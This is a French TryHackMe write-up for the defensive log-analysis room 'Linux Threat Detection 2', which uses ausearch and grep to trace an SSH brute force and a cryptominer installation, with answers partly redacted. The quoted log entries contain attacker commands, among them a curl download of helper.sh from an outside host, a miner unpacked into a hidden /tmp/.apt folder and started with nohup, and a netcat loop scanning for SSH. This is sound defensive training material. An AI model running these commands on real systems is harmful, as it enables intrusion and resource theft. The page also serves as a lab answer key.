---
title: Linux Threat Detection 2
tags: [TryHackMe, Intermédiaire, Défense, Analyse de logs, Linux]
style: border
color: thm
comments: false
description: Analyser les logs d'une machine Linux pour trouver des traces de compromission
---
Lien vers l'épreuve : <https://tryhackme.com/room/linuxthreatdetection2>

![Medium](https://img.shields.io/badge/Difficulté-Intermédiaire-orange?logo=tryhackme)

## Sommaire <!-- omit in toc -->

* [Aperçu de la découverte](#aperçu-de-la-découverte)
* [Motivation pour les attaques](#motivation-pour-les-attaques)
* [Dota3 : Premières Actions](#dota3--premières-actions)
* [Dota3 : Mise en place du mineur de cryptomonnaie](#dota3--mise-en-place-du-mineur-de-cryptomonnaie)

## Aperçu de la découverte

### Utiliser la commande `systemd-detect-virt` <!-- omit in toc -->

Quelle est la réponse de la commande ?

```bash
systemd-detect-virt
```

{% capture spoil %}

```txt
amazon
```

{% endcapture %}
{% include elements/spoil.html %}

### Maintenant utiliser la commande `ps aux` <!-- omit in toc -->

Quel est le chemin complet du binaire antimalware détecté ?

```bash
ps aux
```

{% capture spoil %}

```txt
[...expurgé pour brièveté...]
root         629 59.5  0.3   7744  3476 ?        Rs   09:38   3:36 /bin/bash /var/lib/ultrasec/[...expurgé...]
[...expurgé pour brièveté...]
```

{% endcapture %}
{% include elements/spoil.html %}

## Motivation pour les attaques

### Depuis quel domaine a été téléchargé l'agent Elastic ? <!-- omit in toc -->

Pour télécharger quelque chose sur le serveur, l'attaquant a pu utiliser divers méthodes comme `wget`, `curl` ou encore `scp`.

```bash
ausearch -i -x wget
```

{% capture spoil %}

```txt
----
type=PROCTITLE msg=audit(09/11/25 18:30:48.574:1132) : proctitle=wget https://[...expurgé...]/downloads/beats/elastic-agent/elastic-agent-9.1.3-linux-x86_64.tar.gz 
type=CWD msg=audit(09/11/25 18:30:48.574:1132) : cwd=/home/itsupport 
type=EXECVE msg=audit(09/11/25 18:30:48.574:1132) : argc=2 a0=wget a1=https://[...expurgé...]/downloads/beats/elastic-agent/elastic-agent-9.1.3-linux-x86_64.tar.gz 
type=SYSCALL msg=audit(09/11/25 18:30:48.574:1132) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x647c7d919620 a1=0x647c7d919560 a2=0x647c7d90f550 a3=0x647c7d8bf500 items=2 ppid=3759 pid=3787 auid=itsupport uid=itsupport gid=itsupport euid=itsupport suid=itsupport fsuid=itsupport egid=itsupport sgid=itsupport fsgid=itsupport tty=pts2 ses=170 comm=wget exe=/usr/bin/wget subj=unconfined key=exec
```

{% endcapture %}
{% include elements/spoil.html %}

### Quel est le chemin complet du script "helper.sh" téléchargé ? <!-- omit in toc -->

Cette fois, c'est l'utilitaire `curl` qui a été utilisé.

```bash
ausearch -i -x curl
```

{% capture spoil %}

```txt
----
type=PROCTITLE msg=audit(09/11/25 18:49:39.513:1270) : proctitle=curl http://drobbox-online.thm/helper.sh -O /[...expurgé...] 
type=CWD msg=audit(09/11/25 18:49:39.513:1270) : cwd=/home/ubuntu 
type=EXECVE msg=audit(09/11/25 18:49:39.513:1270) : argc=4 a0=curl a1=http://drobbox-online.thm/helper.sh a2=-O a3=/[...expurgé...] 
type=SYSCALL msg=audit(09/11/25 18:49:39.513:1270) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x5ebf0ff7bab0 a1=0x5ebf0fe94890 a2=0x5ebf0ff7f680 a3=0x5ebf0ff2d490 items=2 ppid=3905 pid=3914 auid=ubuntu uid=ubuntu gid=ubuntu euid=ubuntu suid=ubuntu fsuid=ubuntu egid=ubuntu sgid=ubuntu fsgid=ubuntu tty=pts3 ses=174 comm=curl exe=/usr/bin/curl subj=unconfined key=exec
```

{% endcapture %}
{% include elements/spoil.html %}

Ce dernier est plus susceptible d'être malicieux.

## Dota3 : Premières Actions

### Quel adresse IP est parvenu à *brute-forcer* le serveur {% include dictionary.html word="SSH" %} exposé ? <!-- omit in toc -->

>Les fichiers de logs à analyser se trouvent dans le dossier `/home/ubuntu/scenario`

```bash
grep -i "accepted" auth.log
```

{% capture spoil %}

```txt
2025-09-11T21:13:33.020035+00:00 srv-dev sshd[5339]: Accepted password for root from [...expurgé...] port 55185 ssh2
2025-09-11T21:14:28.475913+00:00 srv-dev sshd[5440]: Accepted password for root from [...expurgé...] port 55195 ssh2
2025-09-11T21:25:01.440085+00:00 srv-dev sshd[5838]: Accepted password for root from [...expurgé...] port 55378 ssh2
2025-09-11T21:25:24.013116+00:00 srv-dev sshd[5914]: Accepted password for root from [...expurgé...] port 55382 ssh2
2025-09-11T21:26:22.589035+00:00 srv-dev sshd[5991]: Accepted password for root from [...expurgé...] port 55388 ssh2
2025-09-11T21:26:35.493956+00:00 srv-dev sshd[6050]: Accepted password for root from [...expurgé...] port 55390 ssh2
```

{% endcapture %}
{% include elements/spoil.html %}

### Quelle commande l'attaquant a utilisé pour listé les derniers utilisateurs connectés ? <!-- omit in toc -->

Pour cette question, la méthode choisie, bien que d'une efficacité limitée, est de récupérer la liste des "proctitle" dans le fichier `audit.log` et de retirer les commandes à-priori sans rapport avec la question.

```bash
ausearch -i -if audit.log | grep -o "proctitle=.*" | sort | uniq | grep -Ev "grep|uname|bash|cut|date|nc|cat|chmod|find|dir.*|id|ip|ps"
```

La liste ainsi obtenue, un processus pourrait convenir :

{% capture spoil %}

```txt
[...expurgé pour brièveté...]
proctitle=bc 
proctitle=expr 1757621384 + 86400 
proctitle=free -m 
proctitle=[...expurgé...] 
proctitle=lscpu 
[...expurgé pour brièveté...]
```

{% endcapture %}
{% include elements/spoil.html %}

Pour s'en assurer, le flag `--help` de la commande permet d'avoir des informations intéressantes.

```bash
[...expurgé...] --help
```

{% capture spoil %}

```txt
Usage:
 [...expurgé...] [options] [<username>...] [<tty>...]

Show a listing of last logged in users.
```

{% endcapture %}
{% include elements/spoil.html %}

### Quels sont les 3 ERD que l'attaquant a cherché avec `egrep` ? <!-- omit in toc -->

La commande `egrep` n'a pas été utilisée directement depuis le terminal, et n'apparaît donc pas en cherchant l'exécutable avec `ausearch -i -x egrep`

```bash
ausearch -i -if audit.log | grep "PROCTITLE.*egrep"
```

{% capture spoil %}

```txt
[...expurgé pour brièveté...]
type=PROCTITLE msg=audit(09/11/25 21:13:37.725:2129) : proctitle=/bin/sh /usr/bin/egrep --color=auto [...expurgé...] 
type=PROCTITLE msg=audit(09/11/25 21:13:37.726:2130) : proctitle=/bin/sh /usr/bin/egrep --color=auto [...expurgé...] 
type=PROCTITLE msg=audit(09/11/25 21:13:37.727:2131) : proctitle=/bin/sh /usr/bin/egrep --color=auto [...expurgé...] 
type=PROCTITLE msg=audit(09/11/25 21:13:37.727:2132) : proctitle=/bin/sh /usr/bin/egrep --color=auto [...expurgé...] 
type=PROCTITLE msg=audit(09/11/25 21:13:37.727:2133) : proctitle=/bin/sh /usr/bin/egrep --color=auto [...expurgé...]
[...expurgé pour brièveté...]
```

{% endcapture %}
{% include elements/spoil.html %}

## Dota3 : Mise en place du mineur de cryptomonnaie

### Quel est le nom du l'archive malveillante transférée par SCP ? <!-- omit in toc -->

Une archive suspecte est observée juste après la sollicitation du service SSHD.

```bash
ausearch -i -if audit.log | grep "proctitle"
```

{% capture spoil %}

```txt
[...expurgé pour brièveté...]
type=PROCTITLE msg=audit(09/11/25 21:14:54.780:2253) : proctitle=/usr/sbin/sshd -D -R 
type=PROCTITLE msg=audit(09/11/25 21:14:55.515:2254) : proctitle=tar xzf [...expurgé...].tar.gz -C /tmp/.apt 
type=PROCTITLE msg=audit(09/11/25 21:14:55.517:2255) : proctitle=tar xzf [...expurgé...].tar.gz -C /tmp/.apt 
type=PROCTITLE msg=audit(09/11/25 21:14:55.518:2256) : proctitle=tar xzf [...expurgé...].tar.gz -C /tmp/.apt 
type=PROCTITLE msg=audit(09/11/25 21:14:55.518:2257) : proctitle=tar xzf [...expurgé...].tar.gz -C /tmp/.apt 
type=PROCTITLE msg=audit(09/11/25 21:14:55.518:2258) : proctitle=tar xzf [...expurgé...].tar.gz -C /tmp/.apt
[...expurgé pour brièveté...]
```

{% endcapture %}
{% include elements/spoil.html %}

### Quelle est la ligne de commande complète du lancement du cryptominer ? <!-- omit in toc -->

```bash
ausearch -i -if audit.log | grep "proctitle=.*[...expurgé...]"
```

{% capture spoil %}

```txt
type=PROCTITLE msg=audit(09/11/25 21:14:55.515:2254) : proctitle=tar xzf [...expurgé...].tar.gz -C /tmp/.apt 
type=PROCTITLE msg=audit(09/11/25 21:14:55.517:2255) : proctitle=tar xzf [...expurgé...].tar.gz -C /tmp/.apt 
type=PROCTITLE msg=audit(09/11/25 21:14:55.518:2256) : proctitle=tar xzf [...expurgé...].tar.gz -C /tmp/.apt 
type=PROCTITLE msg=audit(09/11/25 21:14:55.518:2257) : proctitle=tar xzf [...expurgé...].tar.gz -C /tmp/.apt 
type=PROCTITLE msg=audit(09/11/25 21:14:55.518:2258) : proctitle=tar xzf [...expurgé...].tar.gz -C /tmp/.apt 
type=PROCTITLE msg=audit(09/11/25 21:16:03.850:2331) : proctitle=chmod +x /tmp/.apt/[...expurgé...] 
type=PROCTITLE msg=audit(09/11/25 21:16:08.666:2337) : proctitle=nohup /tmp/.apt/[...expurgé...] 
type=PROCTITLE msg=audit(09/11/25 21:16:08.668:2338) : proctitle=nohup /tmp/.apt/[...expurgé...]
```

{% endcapture %}
{% include elements/spoil.html %}

### Quelle plage d'adresse IP l'attaquant a-t-il scanné pour trouver un service {% include dictionary.html word="SSH" %} ? <!-- omit in toc -->

En filtrant les entrées "proctitle" pour trouver des informations contenant le numéro de port 22 pour le service {% include dictionary.html word="SSH" %}, il apparaît plusieurs commandes {% include dictionary.html word="Netcat" %}.

```bash
ausearch -i -if audit.log | grep "proctitle.*22 "
```

{% capture spoil %}

```txt
type=PROCTITLE msg=audit(09/11/25 21:15:20.512:2283) : proctitle=nohup bash -c for ip in 10.10.12.[...expurgé...]; do nc -zvw1 $ip 22 2>&1 | grep succeeded; done 
type=PROCTITLE msg=audit(09/11/25 21:15:20.513:2284) : proctitle=nohup bash -c for ip in 10.10.12.[...expurgé...]; do nc -zvw1 $ip 22 2>&1 | grep succeeded; done 
type=PROCTITLE msg=audit(09/11/25 21:15:20.513:2285) : proctitle=nohup bash -c for ip in 10.10.12.[...expurgé...]; do nc -zvw1 $ip 22 2>&1 | grep succeeded; done 
type=PROCTITLE msg=audit(09/11/25 21:15:20.513:2286) : proctitle=nohup bash -c for ip in 10.10.12.[...expurgé...]; do nc -zvw1 $ip 22 2>&1 | grep succeeded; done 
type=PROCTITLE msg=audit(09/11/25 21:15:20.513:2287) : proctitle=nohup bash -c for ip in 10.10.12.[...expurgé...]; do nc -zvw1 $ip 22 2>&1 | grep succeeded; done
type=PROCTITLE msg=audit(09/11/25 21:15:20.516:2288) : proctitle=nc -zvw1 10.10.12.[...expurgé...] 22 
type=PROCTITLE msg=audit(09/11/25 21:15:21.521:2292) : proctitle=nc -zvw1 10.10.12.[...expurgé...] 22 
type=PROCTITLE msg=audit(09/11/25 21:15:22.527:2294) : proctitle=nc -zvw1 10.10.12.[...expurgé...] 22 
type=PROCTITLE msg=audit(09/11/25 21:15:23.533:2297) : proctitle=nc -zvw1 10.10.12.[...expurgé...] 22 
type=PROCTITLE msg=audit(09/11/25 21:15:24.538:2299) : proctitle=nc -zvw1 10.10.12.[...expurgé...] 22 
type=PROCTITLE msg=audit(09/11/25 21:15:25.543:2302) : proctitle=nc -zvw1 10.10.12.[...expurgé...] 22 
type=PROCTITLE msg=audit(09/11/25 21:15:26.549:2305) : proctitle=nc -zvw1 10.10.12.[...expurgé...] 22 
type=PROCTITLE msg=audit(09/11/25 21:15:27.555:2308) : proctitle=nc -zvw1 10.10.12.[...expurgé...] 22 
type=PROCTITLE msg=audit(09/11/25 21:15:28.562:2310) : proctitle=nc -zvw1 10.10.12.[...expurgé...] 22 
type=PROCTITLE msg=audit(09/11/25 21:15:29.568:2312) : proctitle=nc -zvw1 10.10.12.[...expurgé...] 22
```

{% endcapture %}
{% include elements/spoil.html %}

---
L'analyse de logs Linux s'étend sur 1 autre box. Pour passer à la suivante :

{% include elements/button.html link="/Hackministrateur/comptes-rendus/LinuxThreatDetection3" text="Epreuve suivante" style="primary" size="sm" %}
